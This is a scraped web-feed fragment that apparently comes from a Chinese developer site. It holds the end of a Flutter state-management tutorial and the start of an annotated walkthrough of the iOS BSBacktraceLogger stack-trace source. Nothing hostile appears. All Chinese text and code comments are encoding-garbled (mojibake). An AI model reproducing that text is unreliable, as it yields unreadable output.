<h3 data-id="heading-21">é‚£setState è§£å†³ä¸äº†ä»€ä¹ˆï¼Ÿ</h3>
<ol>
<li><strong>è·¨é¡µé¢åŒæ­¥</strong>ï¼šä½ åœ¨ä¸ªäººä¸­å¿ƒTabé¡µæ”¹äº†å¤´åƒï¼Œè¿”å›é¦–é¡µTabé¡µå‘ç°å¤´åƒæ²¡å˜ã€‚</li>
<li><strong>æ·±å±‚åµŒå¥—ï¼ˆProp Drillingï¼‰</strong> ï¼šå¦‚æœä½ æƒ³æŠŠä¸€ä¸ªæ•°æ®ä¼ ç»™ç¬¬ 10 å±‚å­ç»„ä»¶ï¼Œä½ ä¸å¾—ä¸åƒæ¥åŠ›æ£’ä¸€æ ·ç©¿é€ä¸­é—´ 9 å±‚ç»„ä»¶ã€‚</li>
<li><strong>é€»è¾‘ä¸ UI è€¦åˆ</strong>ï¼šä¸šåŠ¡é€»è¾‘å…¨å †åœ¨ <code>State</code> ç±»é‡Œï¼Œéš¾ä»¥å†™å•å…ƒæµ‹è¯•ã€‚</li>
<li><strong>å†…å­˜ç®¡ç†</strong>ï¼š<code>setState</code> çš„æ•°æ®éš Widget é”€æ¯è€Œæ¶ˆå¤±ï¼Œæœ‰æ—¶æˆ‘ä»¬éœ€è¦çŠ¶æ€åœ¨é¡µé¢å…³é—­åä¾ç„¶å­˜æ´»ï¼ˆå•ä¾‹æ€ç»´ï¼‰ã€‚</li>
</ol>
<h3 data-id="heading-22">ç®€å•ç†è§£</h3>
<ul>
<li><code>setState</code>ï¼šé€‚åˆ<strong>å±€éƒ¨ã€çŸ­ç”Ÿå‘½å‘¨æœŸ</strong>çš„ UI çŠ¶æ€ç®¡ç†ï¼›</li>
<li><code>Provider / Riverpod</code>ï¼šé€‚åˆ<strong>è·¨é¡µé¢ã€å¤æ‚ä¸šåŠ¡ã€è§£è€¦å’Œæµ‹è¯•</strong>åœºæ™¯ã€‚</li>
</ul>
<h3 data-id="heading-23">å½“ä½ é‡åˆ°ä»¥ä¸‹é—®é¢˜æ—¶ï¼Œå°±åº”è¯¥è€ƒè™‘çŠ¶æ€ç®¡ç†åº“äº†ï¼š</h3>
<ul>
<li><strong>å¤šé¡µé¢å…±äº«æ•°æ®</strong>ï¼ˆå¦‚è´­ç‰©è½¦ã€ç™»å½•é¡µå…±äº«ä¸€ä»½æ•°æ®ï¼Œéœ€è¦åŒæ­¥åˆ·æ–°UIï¼‰ã€‚</li>
<li><strong>ä¼ é€’å±‚çº§å¤ªæ·±ï¼ˆéœ€è¦è§£è€¦ï¼‰</strong>ï¼šå½“ä½ çš„ <code>StatefulWidget</code> è¶…è¿‡ 500 è¡Œï¼Œä¸”é€»è¾‘å¤æ‚æ—¶ã€‚</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–ï¼ˆStatefulWidget è‡ƒè‚¿ï¼‰</strong>ï¼šé€šè¿‡ <code>Consumer</code> å®ç°çœŸæ­£çš„å±€éƒ¨åˆ·æ–°ï¼Œé¿å…çˆ¶ç»„ä»¶é‡å»ºå¸¦åŠ¨å­ç»„ä»¶ã€‚</li>
</ul>
<p>ä¸ç®¡ç”¨ä¸ç”¨çŠ¶æ€åº“ï¼Œåº•å±‚éƒ½æ˜¯åœ¨ã€ŒæŸä¸ªçŠ¶æ€å˜åŒ–æ—¶ï¼Œè§¦å‘ç‰¹å®š Widget é‡å»ºã€ã€‚<br/>
<code>setState</code>Â æ˜¯æ‰‹åŠ¨æ ‡è®°è‡ªå·±å˜è„ï¼›<br/>
Provider / Riverpod åˆ™æ˜¯æ›´æ™ºèƒ½åœ°å¸®ä½ åšâ€œè°éœ€è¦è¢«é€šçŸ¥ã€å¦‚ä½•æ‰¾åˆ°é‚£æ£µå­æ ‘â€çš„äº‹æƒ…ã€‚</p>
<p>åé¢çš„æ–‡ç« ï¼Œæˆ‘å°†å­¦ä¹ â€œProvider/Riverpodâ€çŠ¶æ€åº“ï¼Œæ›´åŠ æ·»åŠ ä¸­å¤§å‹é¡¹ç›®çš„å®æˆ˜ã€‚</p>
<h2 data-id="heading-24">ä¹ã€ä½ ç°åœ¨åº”è¯¥æ€ä¹ˆé€‰ï¼Ÿï¼ˆå®ç”¨å»ºè®®ï¼‰</h2>

























<table><thead><tr><th>åœºæ™¯</th><th>æ¨èæ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>å•ä¸ª Widget</td><td>setState</td></tr><tr><td>çˆ¶å­é€šä¿¡</td><td>çŠ¶æ€æå‡</td></tr><tr><td>å±€éƒ¨å“åº”</td><td>ValueNotifier</td></tr><tr><td>è·¨é¡µé¢ / å…¨å±€</td><td>Provider / Riverpod</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-25">åã€è®°å¿†ç‚¹æ€»ç»“ï¼ˆé‡ç‚¹ï¼‰</h2>
<ul>
<li>çŠ¶æ€ = ä¼šå½±å“ UI çš„æ•°æ®</li>
<li>è°ç”¨çŠ¶æ€ï¼ŒçŠ¶æ€æ”¾è°</li>
<li>å¤šä¸ª Widget ç”¨ â†’ çŠ¶æ€æå‡</li>
<li>setState ä¸å¯æ€•ï¼Œä¹±ç”¨æ‰å¯æ€•</li>
<li>å…ˆææ¸…â€œæ”¾å“ªâ€ï¼Œå†é€‰â€œç”¨å•¥åº“â€</li>
</ul>
<h2 data-id="heading-26">åä¸€ã€å†™åœ¨æœ€å</h2>
<p>â€œçŠ¶æ€ç®¡ç†â€æ˜¯ Flutter ä¸­æœ€å®¹æ˜“è®©äººä¸€å¼€å§‹ç„¦è™‘çš„éƒ¨åˆ†ï¼Œä½†ç»å¤§å¤šæ•° App çš„å‘å±•è¿‡ç¨‹éƒ½æ˜¯ï¼š<br/>
<code>setState â†’ çŠ¶æ€æå‡ â†’ æŠ½é€»è¾‘ç±» â†’ ç®€å•çŠ¶æ€åº“ â†’ å¤æ‚çŠ¶æ€åº“</code><br/>
ä½ ä¸éœ€è¦ä¸€ä¸Šæ¥å°±å®Œå…¨ææ‡‚æ‰€æœ‰åº“ï¼Œåªè¦å…ˆå†™æ¸…æ¥šâ€œçŠ¶æ€æ”¾å“ªâ€ï¼Œå†æ…¢æ…¢å­¦ä¼šâ€œæ€ä¹ˆè®©å®ƒæ›´å¥½ç»´æŠ¤â€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[BSBacktraceLoggeræºç è§£æ]]></title>    <link>https://juejin.cn/post/7600342201794297871</link>    <guid>https://juejin.cn/post/7600342201794297871</guid>    <pubDate>2026-01-29T06:55:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600342201794297871" data-draft-id="7600345782173532194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="BSBacktraceLoggeræºç è§£æ"/> <meta itemprop="keywords" content="iOS"/> <meta itemprop="datePublished" content="2026-01-29T06:55:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOSåœ¨å…¥é—¨"/> <meta itemprop="url" content="https://juejin.cn/user/4037062426627758"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            BSBacktraceLoggeræºç è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4037062426627758/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOSåœ¨å…¥é—¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:55:13.000Z" title="Thu Jan 29 2026 06:55:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å€ŸåŠ©AIè¾…åŠ©ã€‚</p>
</blockquote>
<h2 data-id="heading-0">æºç åœ°å€</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbestswifter%2FBSBacktraceLogger" target="_blank" title="https://github.com/bestswifter/BSBacktraceLogger" ref="nofollow noopener noreferrer">github.com/bestswifterâ€¦</a></p>
<h2 data-id="heading-1">é€è¡Œæ³¨é‡Š</h2>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">//</span>
<span class="hljs-comment">//  BSBacktraceLogger.m</span>
<span class="hljs-comment">//  BSBacktraceLogger</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">//  Created by å¼ æ˜Ÿå®‡ on 16/8/27.</span>
<span class="hljs-comment">//  Copyright Â© 2016å¹´ bestswifter. All rights reserved.</span>
<span class="hljs-comment">//</span>

<span class="hljs-comment">// å¯¼å…¥è‡ªå®šä¹‰å¤´æ–‡ä»¶</span>
<span class="hljs-meta">#import <span class="hljs-string">"BSBacktraceLogger.h"</span></span>
<span class="hljs-comment">// å¯¼å…¥Machå†…æ ¸ç›¸å…³å¤´æ–‡ä»¶ï¼Œç”¨äºçº¿ç¨‹æ“ä½œ</span>
<span class="hljs-meta">#import <span class="hljs-string">&lt;mach/mach.h&gt;</span></span>
<span class="hljs-comment">// åŠ¨æ€é“¾æ¥åº“ç›¸å…³å‡½æ•°ï¼Œç”¨äºç¬¦å·è§£æ</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span>
<span class="hljs-comment">// POSIXçº¿ç¨‹åº“</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>
<span class="hljs-comment">// ç³»ç»Ÿç±»å‹å®šä¹‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-comment">// é™åˆ¶å€¼å®šä¹‰ï¼ˆå¦‚ULONG_MAXç­‰ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span>
<span class="hljs-comment">// å­—ç¬¦ä¸²æ“ä½œå‡½æ•°</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-comment">// åŠ¨æ€é“¾æ¥å™¨ç›¸å…³ï¼Œç”¨äºè·å–é•œåƒä¿¡æ¯</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mach-o/dyld.h&gt;</span></span>
<span class="hljs-comment">// Mach-Oç¬¦å·è¡¨ç»“æ„å®šä¹‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mach-o/nlist.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> -mark DEFINE MACRO FOR DIFFERENT CPU ARCHITECTURE</span>
<span class="hljs-comment">// é’ˆå¯¹ä¸åŒCPUæ¶æ„å®šä¹‰ç›¸åº”çš„å®ï¼Œä»¥é€‚é…ä¸åŒç¡¬ä»¶å¹³å°</span>

<span class="hljs-comment">// ARM64æ¶æ„ï¼ˆ64ä½ARMï¼Œå¦‚iPhone 5såŠä»¥åçš„è®¾å¤‡ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(__arm64__)</span>
<span class="hljs-comment">// å»é™¤æŒ‡ä»¤åœ°å€çš„æ ‡ç­¾ä½ï¼ˆARM64ä¸­ä½2ä½å¯èƒ½è¢«ç”¨ä½œæ ‡ç­¾ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> DETAG_INSTRUCTION_ADDRESS(A) ((A) &amp; ~(3UL))</span>
<span class="hljs-comment">// çº¿ç¨‹çŠ¶æ€ç»“æ„ä½“çš„å¤§å°</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_THREAD_STATE_COUNT ARM_THREAD_STATE64_COUNT</span>
<span class="hljs-comment">// çº¿ç¨‹çŠ¶æ€ç±»å‹</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_THREAD_STATE ARM_THREAD_STATE64</span>
<span class="hljs-comment">// å¸§æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆFrame Pointerï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_FRAME_POINTER __fp</span>
<span class="hljs-comment">// æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ˆStack Pointerï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_STACK_POINTER __sp</span>
<span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨/æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆProgram Counterï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_INSTRUCTION_ADDRESS __pc</span>

<span class="hljs-comment">// ARM32æ¶æ„ï¼ˆ32ä½ARMï¼Œæ—§è®¾å¤‡ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(__arm__)</span>
<span class="hljs-comment">// å»é™¤æŒ‡ä»¤åœ°å€çš„æ ‡ç­¾ä½ï¼ˆARM32ä¸­ä½1ä½å¯èƒ½è¡¨ç¤ºThumbæ¨¡å¼ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> DETAG_INSTRUCTION_ADDRESS(A) ((A) &amp; ~(1UL))</span>
<span class="hljs-comment">// çº¿ç¨‹çŠ¶æ€ç»“æ„ä½“çš„å¤§å°</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_THREAD_STATE_COUNT ARM_THREAD_STATE_COUNT</span>
<span class="hljs-comment">// çº¿ç¨‹çŠ¶æ€ç±»å‹</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_THREAD_STATE ARM_THREAD_STATE</span>
<span class="hljs-comment">// å¸§æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆr7å¯„å­˜å™¨ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_FRAME_POINTER __r[7]</span>
<span class="hljs-comment">// æ ˆæŒ‡é’ˆå¯„å­˜å™¨</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_STACK_POINTER __sp</span>
<span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨å¯„å­˜å™¨</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_INSTRUCTION_ADDRESS __pc</span>

<span class="hljs-comment">// x86_64æ¶æ„ï¼ˆ64ä½Intelï¼Œæ¨¡æ‹Ÿå™¨æˆ–Macï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(__x86_64__)</span>
<span class="hljs-comment">// x86æ¶æ„ä¸éœ€è¦å»æ ‡ç­¾ï¼Œç›´æ¥è¿”å›åœ°å€</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> DETAG_INSTRUCTION_ADDRESS(A) (A)</span>
<span class="hljs-comment">// çº¿ç¨‹çŠ¶æ€ç»“æ„ä½“çš„å¤§å°</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_THREAD_STATE_COUNT x86_THREAD_STATE64_COUNT</span>
<span class="hljs-comment">// çº¿ç¨‹çŠ¶æ€ç±»å‹</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_THREAD_STATE x86_THREAD_STATE64</span>
<span class="hljs-comment">// å¸§æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆBase Pointerï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_FRAME_POINTER __rbp</span>
<span class="hljs-comment">// æ ˆæŒ‡é’ˆå¯„å­˜å™¨</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_STACK_POINTER __rsp</span>
<span class="hljs-comment">// æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆInstruction Pointerï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_INSTRUCTION_ADDRESS __rip</span>

<span class="hljs-comment">// i386æ¶æ„ï¼ˆ32ä½Intelï¼Œæ—§æ¨¡æ‹Ÿå™¨ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(__i386__)</span>
<span class="hljs-comment">// x86æ¶æ„ä¸éœ€è¦å»æ ‡ç­¾</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> DETAG_INSTRUCTION_ADDRESS(A) (A)</span>
<span class="hljs-comment">// çº¿ç¨‹çŠ¶æ€ç»“æ„ä½“çš„å¤§å°</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_THREAD_STATE_COUNT x86_THREAD_STATE32_COUNT</span>
<span class="hljs-comment">// çº¿ç¨‹çŠ¶æ€ç±»å‹</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_THREAD_STATE x86_THREAD_STATE32</span>
<span class="hljs-comment">// å¸§æŒ‡é’ˆå¯„å­˜å™¨</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_FRAME_POINTER __ebp</span>
<span class="hljs-comment">// æ ˆæŒ‡é’ˆå¯„å­˜å™¨</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_STACK_POINTER __esp</span>
<span class="hljs-comment">// æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_INSTRUCTION_ADDRESS __eip</span>

<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>

<span class="hljs-comment">// ä»è¿”å›åœ°å€è®¡ç®—è°ƒç”¨æŒ‡ä»¤åœ°å€ï¼ˆè¿”å›åœ°å€-1å³ä¸ºè°ƒç”¨æŒ‡ä»¤ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> CALL_INSTRUCTION_FROM_RETURN_ADDRESS(A) (DETAG_INSTRUCTION_ADDRESS((A)) - 1)</span>

<span class="hljs-comment">// æ ¹æ®æŒ‡é’ˆå¤§å°ï¼ˆ32ä½æˆ–64ä½ï¼‰å®šä¹‰ä¸åŒçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</span>
<span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(__LP64__)</span>
<span class="hljs-comment">// 64ä½ç³»ç»Ÿçš„æ ¼å¼å®šä¹‰</span>
<span class="hljs-comment">// å †æ ˆè·Ÿè¸ªæ¡ç›®æ ¼å¼ï¼šåºå·(4ä½) æ¨¡å—å(31ä½) åœ°å€(16ä½åå…­è¿›åˆ¶) ç¬¦å·å + åç§»é‡</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> TRACE_FMT         <span class="hljs-string">"%-4d%-31s 0x%016lx %s + %lu"</span></span>
<span class="hljs-comment">// æŒ‡é’ˆå®Œæ•´æ ¼å¼ï¼ˆ16ä½åå…­è¿›åˆ¶ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> POINTER_FMT       <span class="hljs-string">"0x%016lx"</span></span>
<span class="hljs-comment">// æŒ‡é’ˆçŸ­æ ¼å¼</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> POINTER_SHORT_FMT <span class="hljs-string">"0x%lx"</span></span>
<span class="hljs-comment">// ç¬¦å·è¡¨ç»“æ„ä½“ç±»å‹ï¼ˆ64ä½ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_NLIST struct nlist_64</span>
<span class="hljs-meta">#<span class="hljs-keyword">else</span></span>
<span class="hljs-comment">// 32ä½ç³»ç»Ÿçš„æ ¼å¼å®šä¹‰</span>
<span class="hljs-comment">// å †æ ˆè·Ÿè¸ªæ¡ç›®æ ¼å¼ï¼šåºå·(4ä½) æ¨¡å—å(31ä½) åœ°å€(8ä½åå…­è¿›åˆ¶) ç¬¦å·å + åç§»é‡</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> TRACE_FMT         <span class="hljs-string">"%-4d%-31s 0x%08lx %s + %lu"</span></span>
<span class="hljs-comment">// æŒ‡é’ˆå®Œæ•´æ ¼å¼ï¼ˆ8ä½åå…­è¿›åˆ¶ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> POINTER_FMT       <span class="hljs-string">"0x%08lx"</span></span>
<span class="hljs-comment">// æŒ‡é’ˆçŸ­æ ¼å¼</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> POINTER_SHORT_FMT <span class="hljs-string">"0x%lx"</span></span>
<span class="hljs-comment">// ç¬¦å·è¡¨ç»“æ„ä½“ç±»å‹ï¼ˆ32ä½ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BS_NLIST struct nlist</span>
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>

<span class="hljs-comment">// å®šä¹‰æ ˆå¸§ç»“æ„ä½“ï¼Œç”¨äºéå†å‡½æ•°è°ƒç”¨æ ˆ</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BSStackFrameEntry</span>{</span>
    <span class="hljs-comment">// æŒ‡å‘å‰ä¸€ä¸ªæ ˆå¸§çš„æŒ‡é’ˆï¼ˆå½¢æˆé“¾è¡¨ç»“æ„ï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BSStackFrameEntry</span> *<span class="hljs-title">const</span> <span class="hljs-title">previous</span>;</span>
    <span class="hljs-comment">// å½“å‰æ ˆå¸§çš„è¿”å›åœ°å€ï¼ˆå³è°ƒç”¨è€…çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> return_address;
} BSStackFrameEntry;

<span class="hljs-comment">// é™æ€å…¨å±€å˜é‡ï¼Œä¿å­˜ä¸»çº¿ç¨‹çš„Machç«¯å£ID</span>
<span class="hljs-type">static</span> <span class="hljs-type">mach_port_t</span> main_thread_id;

@implementation BSBacktraceLogger

<span class="hljs-comment">// +loadæ–¹æ³•åœ¨ç±»åŠ è½½æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œæ—©äºmainå‡½æ•°æ‰§è¡Œ</span>
+ (<span class="hljs-type">void</span>)load {
    <span class="hljs-comment">// ä¿å­˜ä¸»çº¿ç¨‹çš„Machçº¿ç¨‹IDï¼Œç”¨äºåç»­è¯†åˆ«ä¸»çº¿ç¨‹</span>
    main_thread_id = mach_thread_self();
}

<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> -mark Implementation of interface</span>
<span class="hljs-comment">// å…¬å…±æ¥å£å®ç°éƒ¨åˆ†</span>

<span class="hljs-comment">// è·å–æŒ‡å®šNSThreadçš„è°ƒç”¨æ ˆå›æº¯ä¿¡æ¯</span>
+ (NSString *)bs_backtraceOfNSThread:(NSThread *)thread {
    <span class="hljs-comment">// å°†NSThreadè½¬æ¢ä¸ºMachçº¿ç¨‹ï¼Œç„¶åè·å–å…¶å›æº¯ä¿¡æ¯</span>
    <span class="hljs-keyword">return</span> _bs_backtraceOfThread(bs_machThreadFromNSThread(thread));
}

<span class="hljs-comment">// è·å–å½“å‰çº¿ç¨‹çš„è°ƒç”¨æ ˆå›æº¯ä¿¡æ¯</span>
+ (NSString *)bs_backtraceOfCurrentThread {
    <span class="hljs-comment">// è·å–å½“å‰çº¿ç¨‹å¯¹è±¡å¹¶è°ƒç”¨é€šç”¨æ–¹æ³•</span>
    <span class="hljs-keyword">return</span> [self bs_backtraceOfNSThread:[NSThread currentThread]];
}

<span class="hljs-comment">// è·å–ä¸»çº¿ç¨‹çš„è°ƒç”¨æ ˆå›æº¯ä¿¡æ¯</span>
+ (NSString *)bs_backtraceOfMainThread {
    <span class="hljs-comment">// è·å–ä¸»çº¿ç¨‹å¯¹è±¡å¹¶è°ƒç”¨é€šç”¨æ–¹æ³•</span>
